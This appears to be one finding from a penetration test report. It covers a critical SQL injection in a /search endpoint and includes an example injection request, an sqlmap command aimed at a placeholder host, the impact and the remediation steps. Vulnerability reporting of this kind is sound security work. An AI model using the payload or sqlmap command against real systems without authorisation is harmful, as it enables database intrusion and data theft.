# Finding 01 — SQL Injection in /search (Critical)

**Severity:** Critical  
**Endpoint:** `GET /search?q=`  
**CWE:** CWE-89 (SQL Injection)

## Description
The `q` parameter is concatenated into an SQL statement without parameterization. This allows an attacker to inject SQL and retrieve data from the database.

## PoC
Example request:
```
GET /search?q=' OR '1'='1-- HTTP/1.1
Host: target.example
```
Expected result: application returns all rows or sensitive data.

Example sqlmap command used:
```
sqlmap -u "https://target.example/search?q=TEST" --batch --risk=2 --level=3 -p q
```

## Impact
Full or partial data exfiltration, authentication bypass (depending on query), and potential privilege escalation.

## Remediation
- Use parameterized queries / prepared statements.
- Validate and sanitize input, but do not rely on this alone.
- Use a least-privileged database account.
- Implement WAF rules to block common SQLi patterns.

## Evidence
See `evidence/sqlmap-output.txt` and `evidence/screenshots/sqli.png` for output and screenshots.
